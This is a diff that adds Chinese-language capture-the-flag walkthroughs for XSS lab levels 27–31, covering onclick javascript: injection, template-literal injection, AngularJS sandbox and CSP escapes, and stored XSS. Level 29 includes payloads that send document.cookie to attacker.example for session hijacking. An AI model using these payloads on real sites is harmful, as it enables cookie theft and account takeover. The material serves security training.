@@ -652,3 +652,193 @@ echo "<link rel='canonical' href='$safe_url'>";
 
 **Flag:** `flag{a1b2c3d4-e5f6-7890-1234-567890abcdef}`
 
+## Level 27: Stored XSS into onclick event
+
+**源码分析：**
+- 入口与存储：评论通过 POST 被写入 [index.php](file:///d:/Book/XSS-Sec/level27/index.php) 的 JSON 文件 [comments.json](file:///d:/Book/XSS-Sec/level27/comments.json) 中，未对字段进行安全校验
+```php
+save_comment($dataFile, [
+    'author' => $author,
+    'website' => $website,
+    'text' => $text,
+    'time' => time()
+]);
+```
+- 反射点：作者名上的链接不是使用 href，而是绑定了 onclick，将 Website 字段原样（仅做引号转义）置入单引号包裹的 JS 字符串，并赋值给 window.location.href
+```php
+$website_for_js = encode_for_onclick_js_single_quoted($website_raw);
+<a href="#" onclick="window.location.href='<?php echo $website_for_js; ?>'; return false;">
+```
+- encode_for_onclick_js_single_quoted 只做了引号和尖括号的替换，但不会阻止 javascript: 这种伪协议
+```php
+function encode_for_onclick_js_single_quoted($s) {
+    $s = str_replace("\\", "\\\\", $s);
+    $s = str_replace("'", "\\'", $s);
+    $s = str_replace('"', '&quot;', $s);
+    $s = str_replace("<", "&lt;", $s);
+    $s = str_replace(">", "&gt;", $s);
+    return $s;
+}
+```
+
+**通关思路：**
+- 将 Website 字段设置为 javascript 伪协议，点击作者名时浏览器直接执行该 JS
+- 评论正文 text 在该页面经过 htmlspecialchars 输出，不易利用；本关关键在于 Website 的 onclick 跳转
+
+**Payload:** `javascript:alert(document.cookie)`
+
+---
+
+## Level 28: Reflected XSS into a template literal
+
+**源码分析：**
+- 输入 q 被处理为 $escaped 并放入 JS 模板字符串中：[index.php](file:///d:/Book/XSS-Sec/level28/index.php)
+```php
+$escaped = escape_for_template_literal($q);
+<script>
+    const preview = `Searching for: <?php echo $escaped; ?>`;
+    document.getElementById('result').innerText = preview;
+</script>
+```
+- 逃逸函数只对 `< > " ' \ `` 做了 Unicode 转义，未处理占位符语法标识 `${` 与 `}`：
+```php
+function escape_for_template_literal($s) {
+    return strtr($s, [
+        '<' => '\\u003C', '>' => '\\u003E', '"' => '\\u0022',
+        "'" => '\\u0027', '\\' => '\\u005C', '`' => '\\u0060',
+    ]);
+}
+```
+- 在 ES6 模板字符串中，`${...}` 会在构造字符串阶段被求值，因此只要能插入 `${...}`，表达式即刻执行
+
+**通关思路：**
+- 构造 `${alert(1)}` 放入 q，模板字符串在生成时执行 alert，再将结果拼接到字符串中；innerText 仅用于最终展示，不影响执行
+
+**Payload:** `${alert(1)}`
+
+---
+
+## Level 29: Stored XSS + Cookie 窃取 + 会话劫持
+
+**源码分析：**
+- 评论存储与输出：
+  - 发布页 [index.php](file:///d:/Book/XSS-Sec/level29/index.php) 直接将 `text` 原样 echo，未做转义
+  - 受害者视图 [admin-view.php](file:///d:/Book/XSS-Sec/level29/admin-view.php) 同样对 `text` 原样输出，任何脚本都会执行
+```php
+// index.php
+<div class="text"><?php echo $c['text']; ?></div>
+// admin-view.php
+<div><?php echo $c['text']; ?></div>
+```
+- 管理员 Cookie：受害者视图设置了管理员的 session Cookie（模拟受害者浏览器环境）
+```php
+setcookie('session', 'admin_session_value', time() + 1800, '/level29/admin-view.php');
+```
+- 权限页面 [my-account.php](file:///d:/Book/XSS-Sec/level29/my-account.php) 通过 Cookie 判断是否为管理员
+```php
+$isAdmin = isset($_COOKIE['session']) && $_COOKIE['session'] === 'admin_session_value';
+```
+- 清空评论功能存在于发布页，便于测试链路
+```php
+if (isset($_POST['action']) && $_POST['action'] === 'clear') { file_put_contents($dataFile, '[]'); }
+```
+
+**通关思路：**
+1. 在发布页提交存储型 XSS，利用受害者视图自动载入评论执行脚本
+2. 脚本中读取受害者（管理员） Cookie 并外带到攻击者服务器
+3. 攻击者将窃取的 Cookie 值设置到自己的浏览器，然后访问 my-account.php 获得管理员权限与 Flag
+
+**示例 Payload（评论 text 字段）：**
+```html
+<script>
+  new Image().src = 'https://attacker.example/collect?c=' + encodeURIComponent(document.cookie);
+</script>
+```
+或使用更隐蔽的标签事件：
+```html
+<img src=x onerror="fetch('https://attacker.example/collect?c='+encodeURIComponent(document.cookie))">
+```
+
+**Flag 获取：**
+- 将浏览器的 `session` Cookie 设置为 `admin_session_value` 后，访问 [my-account.php](file:///d:/Book/XSS-Sec/level29/my-account.php) 即可显示：
+```
+flag{64a307ae-44e4-4c23-9246-65c3c0174098}
+```
+
+---
+
+## Level 30: AngularJS 沙箱逃逸（无字符串）
+
+**源码分析：**
+- 表达式注入点位于模板插值与 ng-init：[index.php](file:///d:/Book/XSS-Sec/level30/index.php)
+```php
+// 取第一个 & 之后的整段查询串作为表达式，进行 urldecode 后注入
+<div>{{ <?php echo $expr; ?> }}</div>
+<div ng-init="<?php echo $expr; ?>"></div>
+```
+- AngularJS 版本为 1.4.4（按实验环境），该版本的沙箱可通过覆盖 String.prototype.charAt 并配合 orderBy 过滤器参数构造实现逃逸
+
+**通关思路：**
+- 使用 PortSwigger 提供的无字符串逃逸链：
+  1. 通过 `toString()` 获取 String 原型，再通过 `constructor.prototype.charAt=[].join` 覆盖 charAt 破坏沙箱标识符检查
+  2. 利用 `[1]|orderBy:` 将右侧作为过滤器参数
+  3. 再次通过 `toString().constructor.fromCharCode(...)` 生成字符串 `x=alert(1)`，完成执行
+
+**Payload：**
+```
+?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
+```
+说明：
+- `%3d` 为 `=` 的 URL 编码；整体查询串会被服务端 urldecode 后原样注入表达式
+- `fromCharCode(120,61,97,108,101,114,116,40,49,41)` 生成字符串 `x=alert(1)`
+- 该链条在 1.4.4 环境下可在无显式字符串与无 `$eval` 的条件下完成沙箱逃逸并执行
+
+---
+
+## Level 31: AngularJS CSP Escape
+
+**源码分析：**
+- CSP 设置在页面头部：[level31/index.php](file:///d:/Book/XSS-Sec/level31/index.php#L1-L16)
+```php
+header("Content-Security-Policy: default-src 'self'; script-src 'self' https://ajax.googleapis.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; style-src-elem 'self' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com data:; img-src 'self' data:; connect-src 'self' https://ajax.googleapis.com; object-src 'none'; base-uri 'self'");
+```
+- Angular 环境与注入点：
+  - 页面引入 AngularJS 1.4.4 并在 body 上启用 `ng-app`：[level31/index.php](file:///d:/Book/XSS-Sec/level31/index.php#L12-L17)
+  - 反射逻辑对 `search` 做一次 URL 解码后直接输出到 DOM（位于 Angular 作用域内）：
+```php
+$render = urldecode($search);
+<div id="content"><?php echo $render; ?></div>
+```
+- 自动触发逻辑：同源外部脚本在加载后尝试聚焦 `id=x` 的元素（用于触发 `ng-focus` 表达式）：[focus.js](file:///d:/Book/XSS-Sec/level31/focus.js)
+```javascript
+document.addEventListener('DOMContentLoaded', function () {
+  setTimeout(function () {
+    var el = document.getElementById('x');
+    if (el && typeof el.focus === 'function') { try { el.focus(); } catch (e) {} }
+  }, 50);
+});
+```
+
+**通关思路：**
+- 构造一个可聚焦的元素并在其 `ng-focus` 中注入表达式：
+  - `$event.composedPath()` 获取事件路径数组（Chrome），最后一个元素是 `window`
+  - `| orderBy: '...’` 使用过滤器语法将右侧字符串作为参数，两者结合在遍历到 `window` 时执行调用
+  - 将 `alert` 赋给变量 `z`，在到达 `window` 的作用域时调用 `z(document.cookie)`，规避 Angular 对 `window` 的显式访问检查
+- 由于表达式由 Angular 在模板编译时执行，不属于内联 `<script>`，因此不会被 `script-src` 拦截；聚焦由同源外部脚本触发，符合 CSP
+
+**Payload（URL 参数编码形态）：**
+```
+%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x
+```
+或直接在输入框中粘贴（无需编码）：
+```
+<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x
+```
+
+**执行流程：**
+1. 服务端对 `search` 执行 `urldecode` 并输出到 Angular 作用域中的 `#content`，注入成为真实 DOM 元素
+2. Angular 1.4.4 编译该元素的 `ng-focus` 指令，表达式就绪
+3. 页面加载后外部脚本聚焦 `id=x`，触发 `ng-focus`
+4. 表达式通过 `composedPath()` 与 `orderBy` 在到达 `window` 时调用 `z(document.cookie)`，弹出 Cookie
+
+---
